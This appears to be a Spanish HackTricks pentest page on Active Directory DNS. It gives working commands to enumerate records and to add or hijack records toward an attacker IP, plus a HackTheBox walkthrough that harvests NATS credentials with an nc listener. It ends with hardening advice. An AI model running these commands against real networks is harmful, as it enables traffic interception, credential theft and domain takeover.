# Registros DNS de AD

{{#include ../../banners/hacktricks-training.md}}

De forma predeterminada, **cualquier usuario** de Active Directory puede **enumerar todos los registros DNS** de las zonas DNS del Dominio o del Bosque, de forma similar a una transferencia de zona (los usuarios pueden listar los objetos secundarios de una zona DNS en un entorno AD).

La herramienta [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) permite la **enumeración** y **exportación** de **todos los registros DNS** de la zona con fines de reconocimiento de redes internas.<sup>[[4]](#references)</sup>
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (abril de 2025) añade salida JSON/Greppable (`--json`), resolución DNS multihilo y compatibilidad con TLS 1.2/1.3 al enlazarse a LDAPS

Para obtener más información, lee [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## Creación / modificación de registros (ADIDNS spoofing)

Debido a que el grupo **Authenticated Users** tiene el permiso **Create Child** en la DACL de la zona de forma predeterminada, cualquier cuenta de dominio (o cuenta de equipo) puede registrar registros adicionales. Esto puede utilizarse para el secuestro de tráfico, la coerción de NTLM relay o incluso el compromiso total del dominio.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py viene incluido con Impacket ≥0.12.0)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Primitivas de ataque comunes

1. **Wildcard record** – `*.<zone>` convierte el servidor DNS de AD en un responder para toda la empresa, similar al spoofing de LLMNR/NBNS. Puede abusarse para capturar hashes NTLM o relayarlos a LDAP/SMB.  (Requiere que WINS-lookup esté deshabilitado.)<sup>[[1]](#references)</sup>
2. **WPAD hijack** – añade `wpad` (o un registro **NS** que apunte a un host del atacante para omitir el Global-Query-Block-List) y actúa como proxy transparente de las solicitudes HTTP salientes para recolectar credenciales. Microsoft corrigió los bypasses de wildcard/DNAME (CVE-2018-8320), pero los **NS-records siguen funcionando**.<sup>[[1]](#references)</sup>
3. **Stale entry takeover** – reclama la dirección IP que pertenecía anteriormente a una workstation y la entrada DNS asociada seguirá resolviendo, lo que permite ataques de resource-based constrained delegation o Shadow-Credentials sin tocar DNS.
4. **DHCP → DNS spoofing** – en una implementación predeterminada de Windows con DHCP+DNS, un atacante no autenticado en la misma subred puede sobrescribir cualquier registro A existente (incluidos los Domain Controllers) enviando solicitudes DHCP falsificadas que desencadenan actualizaciones DNS dinámicas (Akamai “DDSpoof”, 2023). Esto proporciona machine-in-the-middle sobre Kerberos/LDAP y puede provocar la toma de control total del dominio.<sup>[[2]](#references)</sup>
5. **Certifried (CVE-2022-26923)** – cambia el `dNSHostName` de una cuenta de máquina que controles, registra un registro A coincidente y solicita un certificado para ese nombre para suplantar al DC. Herramientas como **Certipy** o **BloodyAD** automatizan completamente el flujo.

---

### Hijacking de servicios internos mediante registros dinámicos obsoletos (caso NATS)

Cuando las actualizaciones dinámicas permanecen abiertas para todos los usuarios autenticados, **el nombre de un servicio dado de baja puede reclamarse de nuevo y apuntarse a la infraestructura del atacante**. El DC Mirage de HTB expuso el hostname `nats-svc.mirage.htb` después del DNS scavenging, por lo que cualquier usuario con pocos privilegios podía:<sup>[[3]](#references)</sup>

1. **Confirmar que falta el registro** y obtener información sobre el SOA con `dig`:
```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```
2. **Recrear el registro** hacia una interfaz externa/VPN que controlen:
```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```
3. **Impersonar el servicio en texto plano**. Los clientes de NATS esperan ver un banner `INFO { ... }` antes de enviar las credenciales, por lo que copiar un banner legítimo del broker real es suficiente para recolectar secretos:
```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```
Cualquier cliente que resuelva el nombre secuestrado filtrará inmediatamente su frame JSON `CONNECT` (incluyendo `"user"`/`"pass"`) al listener. Ejecutar el binario oficial `nats-server -V` en el host del atacante, desactivar la redacción de logs o simplemente capturar la sesión con Wireshark produce las mismas credenciales en texto plano, porque TLS era opcional.

4. **Pivot con las creds capturadas** – en Mirage, la cuenta de NATS robada proporcionó acceso a JetStream, lo que expuso eventos históricos de autenticación que contenían nombres de usuario/contraseñas reutilizables de AD.

Este patrón se aplica a cualquier servicio integrado con AD que dependa de handshakes TCP no seguros (HTTP APIs, RPC, MQTT, etc.): una vez secuestrado el registro DNS, el atacante se convierte en el servicio.

---

## Detección y hardening

* Deniega a **Authenticated Users** el derecho *Create all child objects* en zonas sensibles y delega las actualizaciones dinámicas a una cuenta dedicada utilizada por DHCP.
* Si se requieren actualizaciones dinámicas, configura la zona como **Secure-only** y habilita **Name Protection** en DHCP para que únicamente el objeto de equipo propietario pueda sobrescribir su propio registro.
* Monitoriza los IDs de evento del DNS Server 257/252 (actualización dinámica), 770 (transferencia de zona) y las escrituras LDAP en `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Bloquea nombres peligrosos (`wpad`, `isatap`, `*`) con un registro intencionadamente benigno o mediante la **Global Query Block List**.
* Mantén los servidores DNS actualizados; por ejemplo, los bugs de RCE CVE-2024-26224 y CVE-2024-26231 alcanzaron **CVSS 9.8** y son explotables remotamente contra Domain Controllers.

## Referencias

- [1] [ADIDNS Revisited - WPAD, GQBL, and More](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, sigue siendo la referencia de facto para los ataques wildcard/WPAD)
- [2] [Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
- [3] [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Getting in the Zone: dumping Active Directory DNS using adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

{{#include ../../banners/hacktricks-training.md}}
